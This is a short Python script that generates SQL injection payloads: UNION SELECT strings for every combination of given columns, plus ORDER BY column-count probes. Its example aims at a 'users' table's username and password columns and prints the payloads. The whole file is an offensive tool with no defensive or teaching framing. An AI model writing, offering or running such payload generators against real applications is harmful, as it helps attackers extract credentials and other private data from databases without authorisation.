import itertools

def generate_payloads(table_name, column_names):
    payloads = []
    column_combinations = []

    # Generate all possible combinations of column names
    for r in range(1, len(column_names) + 1):
        column_combinations.extend(itertools.combinations(column_names, r))

    # Generate payloads for each combination
    for combination in column_combinations:
        # Generate UNION SELECT payload
        union_payload = f"' UNION SELECT {', '.join(combination)} FROM {table_name}--"
        payloads.append(union_payload)

        # Generate ORDER BY payload
        for i in range(len(combination)):
            order_by_payload = f"' ORDER BY {i + 1}--"
            payloads.append(order_by_payload)

    return payloads

# Example usage
table_name = "users"
column_names = ["id", "username", "password"]
payloads = generate_payloads(table_name, column_names)

# Print the generated payloads
for payload in payloads:
    print(payload)
